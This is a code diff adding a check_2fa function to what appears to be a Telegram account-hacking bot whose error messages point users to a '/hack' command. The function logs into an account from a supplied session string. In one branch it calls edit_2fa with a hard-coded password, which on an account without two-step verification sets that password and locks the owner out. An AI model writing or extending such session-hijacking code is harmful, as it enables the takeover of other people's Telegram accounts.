@@ -72,3 +72,34 @@ async def get_otp(session):
     if err:
         return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
     return i
+
+async def check_2fa(session):
+    err = ""
+    i = ""
+    try:
+        if session.endswith("="):
+            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
+            await steve.connect()
+            try:
+                await steve.edit_2fa("idkbsdkjsj")
+                i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴅɪsᴀʙʟᴇᴅ"
+                
+            except Exception as e:
+                print(e)
+                i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ"
+                        
+            await steve.disconnect() 
+                             
+        else:    
+            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+                yes = await stark.invoke(functions.account.GetPassword())
+                if yes.has_password:
+                    i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ"
+                else:
+                    i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴅɪsᴀʙʟᴇᴅ"                                                           
+    except Exception as idk:
+        err += str(idk)
+                    
+    if err:
+        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
+    return i
